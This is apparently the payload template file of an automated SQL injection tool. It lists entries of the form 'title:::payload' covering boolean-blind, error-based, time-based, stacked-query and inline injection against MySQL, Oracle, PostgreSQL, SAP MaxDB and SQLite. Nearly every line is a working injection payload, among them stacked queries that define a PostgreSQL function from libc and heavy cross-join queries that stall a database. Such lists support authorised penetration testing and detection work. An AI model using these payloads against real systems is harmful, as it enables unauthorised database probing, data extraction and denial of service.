MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP):::AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))
MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED):::OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP):::OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))
MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED):::,(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)
MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP):::,(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x)))s)
MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED):::(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
MySQL >= 5.5 error-based - Parameter replace (EXP):::EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))
MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS):::AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))
MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS):::OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))
MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS):::,(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8))))x)
MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS):::JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))
MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT):::AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1])
MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET):::AND MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])
MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int):::AND ([RANDNUM]=[RANDNUM])*[RANDNUM1]
MySQL AND time-based blind (ELT - comment):::AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
MySQL AND time-based blind (ELT):::AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT):::OR ELT([RANDNUM]=[RANDNUM],[RANDNUM1])
MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET):::OR MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])
MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int):::OR ([RANDNUM]=[RANDNUM])*[RANDNUM1]
MySQL OR error-based - WHERE or HAVING clause (FLOOR):::OR 1 GROUP BY CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)
MySQL OR time-based blind (ELT - comment):::OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
MySQL OR time-based blind (ELT):::OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause:::RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))
MySQL UNION query (NULL) - 1 to 10 columns:::None
MySQL UNION query (NULL) - 11 to 20 columns:::None
MySQL UNION query (NULL) - 21 to 30 columns:::None
MySQL UNION query (NULL) - 31 to 40 columns:::None
MySQL UNION query (NULL) - 41 to 50 columns:::None
MySQL UNION query (NULL) - [COLSTART] to [COLSTOP] columns (custom):::None
MySQL UNION query ([CHAR]) - 1 to 10 columns:::None
MySQL UNION query ([CHAR]) - 11 to 20 columns:::None
MySQL UNION query ([CHAR]) - 21 to 30 columns:::None
MySQL UNION query ([CHAR]) - 31 to 40 columns:::None
MySQL UNION query ([CHAR]) - 41 to 50 columns:::None
MySQL UNION query ([CHAR]) - [COLSTART] to [COLSTOP] columns (custom):::None
MySQL UNION query ([RANDNUM]) - 1 to 10 columns:::None
MySQL UNION query ([RANDNUM]) - 11 to 20 columns:::None
MySQL UNION query ([RANDNUM]) - 21 to 30 columns:::None
MySQL UNION query ([RANDNUM]) - 31 to 40 columns:::None
MySQL UNION query ([RANDNUM]) - 41 to 50 columns:::None
MySQL UNION query ([RANDNUM]) - [COLSTART] to [COLSTOP] columns (custom):::None
MySQL boolean-based blind - Parameter replace (ELT - original value):::ELT([RANDNUM]=[RANDNUM],[ORIGVALUE])
MySQL boolean-based blind - Parameter replace (ELT):::ELT([RANDNUM]=[RANDNUM],[RANDNUM1])
MySQL boolean-based blind - Parameter replace (MAKE_SET - original value):::MAKE_SET([RANDNUM]=[RANDNUM],[ORIGVALUE])
MySQL boolean-based blind - Parameter replace (MAKE_SET):::MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])
MySQL boolean-based blind - Parameter replace (bool*int - original value):::([RANDNUM]=[RANDNUM])*[ORIGVALUE]
MySQL boolean-based blind - Parameter replace (bool*int):::([RANDNUM]=[RANDNUM])*[RANDNUM1]
MySQL inline queries:::(SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))
MySQL time-based blind - Parameter replace (ELT):::ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
MySQL time-based blind - Parameter replace (MAKE_SET):::MAKE_SET([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
MySQL time-based blind - Parameter replace (bool):::([RANDNUM]=[RANDNUM] AND SLEEP([SLEEPTIME]))
OR boolean-based blind - WHERE or HAVING clause:::OR [RANDNUM]=[RANDNUM]
OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment):::OR [RANDNUM]=[RANDNUM]
OR boolean-based blind - WHERE or HAVING clause (MySQL comment):::OR [RANDNUM]=[RANDNUM]
OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment):::OR NOT [RANDNUM]=[RANDNUM]
OR boolean-based blind - WHERE or HAVING clause (NOT - comment):::OR NOT [RANDNUM]=[RANDNUM]
OR boolean-based blind - WHERE or HAVING clause (NOT):::OR NOT [RANDNUM]=[RANDNUM]
OR boolean-based blind - WHERE or HAVING clause (comment):::OR [RANDNUM]=[RANDNUM]
OR boolean-based blind - WHERE or HAVING clause (subquery - comment):::OR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN):::AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL
Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN):::AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH):::AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS):::AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')
Oracle AND error-based - WHERE or HAVING clause (XMLType):::AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
Oracle AND time-based blind:::AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
Oracle AND time-based blind (comment):::AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
Oracle AND time-based blind (heavy query - comment):::AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
Oracle AND time-based blind (heavy query):::AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN):::OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL
Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN):::OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH):::OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS):::OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')
Oracle OR error-based - WHERE or HAVING clause (XMLType):::OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
Oracle OR time-based blind:::OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
Oracle OR time-based blind (comment):::OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
Oracle OR time-based blind (heavy query - comment):::OR [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
Oracle OR time-based blind (heavy query):::OR [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
Oracle boolean-based blind - ORDER BY, GROUP BY clause:::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
Oracle boolean-based blind - Parameter replace:::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
Oracle boolean-based blind - Parameter replace (original value):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
Oracle boolean-based blind - Stacked queries:::;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL
Oracle error-based - ORDER BY, GROUP BY clause:::,(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
Oracle error-based - Parameter replace:::(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
Oracle inline queries:::(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]' FROM DUAL)
Oracle stacked queries (DBMS_LOCK.SLEEP - comment):::;BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END
Oracle stacked queries (DBMS_LOCK.SLEEP):::;BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END
Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment):::;SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL
Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE):::;SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL
Oracle stacked queries (USER_LOCK.SLEEP - comment):::;BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END
Oracle stacked queries (USER_LOCK.SLEEP):::;BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END
Oracle stacked queries (heavy query - comment):::;SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5
Oracle stacked queries (heavy query):::;SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5
Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP):::,(BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)
Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP):::BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;
Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)
Oracle time-based blind - Parameter replace (heavy queries):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL)
PostgreSQL < 8.2 stacked queries (Glibc - comment):::;CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])
PostgreSQL < 8.2 stacked queries (Glibc):::;CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])
PostgreSQL > 8.1 AND time-based blind:::AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
PostgreSQL > 8.1 AND time-based blind (comment):::AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
PostgreSQL > 8.1 OR time-based blind:::OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
PostgreSQL > 8.1 OR time-based blind (comment):::OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
PostgreSQL > 8.1 stacked queries:::;SELECT PG_SLEEP([SLEEPTIME])
PostgreSQL > 8.1 stacked queries (comment):::;SELECT PG_SLEEP([SLEEPTIME])
PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause:::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE 1/(SELECT 0) END))
PostgreSQL > 8.1 time-based blind - Parameter replace:::(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST):::AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL
PostgreSQL AND error-based - WHERE or HAVING clause:::AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)
PostgreSQL AND time-based blind (heavy query - comment):::AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
PostgreSQL AND time-based blind (heavy query):::AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST):::OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL
PostgreSQL OR error-based - WHERE or HAVING clause:::OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)
PostgreSQL OR time-based blind (heavy query - comment):::OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
PostgreSQL OR time-based blind (heavy query):::OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES):::,(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)
PostgreSQL boolean-based blind - ORDER BY clause (original value):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))
PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause:::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/(SELECT 0) END))
PostgreSQL boolean-based blind - Parameter replace:::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))
PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value):::(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)
PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES):::(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)
PostgreSQL boolean-based blind - Parameter replace (original value):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))
PostgreSQL boolean-based blind - Stacked queries:::;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)
PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES):::;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1
PostgreSQL error-based - ORDER BY, GROUP BY clause:::,(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))
PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES):::,(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))
PostgreSQL error-based - Parameter replace:::(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))
PostgreSQL error-based - Parameter replace (GENERATE_SERIES):::(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))
PostgreSQL inline queries:::(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]')
PostgreSQL stacked queries (heavy query - comment):::;SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)
PostgreSQL stacked queries (heavy query):::;SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)
PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1/(SELECT 0) END))
PostgreSQL time-based blind - Parameter replace (heavy query):::(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
SAP MaxDB AND time-based blind (heavy query - comment):::AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
SAP MaxDB AND time-based blind (heavy query):::AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
SAP MaxDB OR time-based blind (heavy query - comment):::OR [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
SAP MaxDB OR time-based blind (heavy query):::OR [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause:::,(CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END)
SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value):::,(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)
SAP MaxDB boolean-based blind - Stacked queries:::;SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END
SAP MaxDB stacked queries (heavy query - comment):::;SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3
SAP MaxDB stacked queries (heavy query):::;SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3
SAP MaxDB time-based blind - Parameter replace (heavy query):::(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
SQLite > 2.0 AND time-based blind (heavy query - comment):::AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
SQLite > 2.0 AND time-based blind (heavy query):::AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
SQLite > 2.0 OR time-based blind (heavy query - comment):::OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
SQLite > 2.0 OR time-based blind (heavy query):::OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
SQLite > 2.0 stacked queries (heavy query - comment):::;SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
SQLite > 2.0 stacked queries (heavy query):::;SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
SQLite > 2.0 time-based blind - Parameter replace (heavy query):::(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))))
SQLite inline queries:::SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))||'[DELIMITER_STOP]'
